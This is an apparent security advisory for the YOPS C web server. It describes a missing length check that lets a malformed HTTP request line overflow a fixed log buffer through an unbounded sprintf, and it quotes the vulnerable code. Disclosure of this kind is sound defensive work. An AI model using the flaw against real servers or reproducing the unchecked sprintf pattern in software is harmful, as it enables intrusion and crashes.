[Software]

 - YOPS (Your Open Personal [WEB] Server)

[Vendor Product Description]

 - YOPS (Your Own Personal [WEB] Server) is a small SEDA-like HTTP
server for Linux OS written in C. There are 7 stages (accept, parse,
launch, fetch, error, send and log), and pipes are used as interstage
channels.

[Bug Description]

 - In function http_parse_request_header the application fails to do a
boundary check for a malformed buffer received as a HTTP command
(HEAD/GET/POST), prior to use it as input for logger variable at
swebs_record_log function.

 --- http.c snippet ---
int http_parse_request_header(char *data, struct http_request_header *h)
{
       int r;
       int ver, rev;
       char *s, *tok, *l, *prm;
[...]
       r = sscanf(h->http, " HTTP/%d.%d ", &ver, &rev);
       if (r != 2)
               return -400;
[...]
}
 --- END snippet ---

 --- swebs.c snippet ---
int swebs_record_log(int log, JOB *job)
{
       int err;
       time_t now;
       char timestr[32];
       char logrec[MAX_REQUEST_LINE_LEN + 1];
[...]
       sprintf (
               logrec,
               "%s\t[%s]\t\"%s\"\t(%d+%d/%d)\t%d",
               job->client,
               timestr,
               job->hdr.request_line,
               job->response_hlen,
               job->response_blen_sent,
               job->response_blen,
               job->status
               );
[...]
}
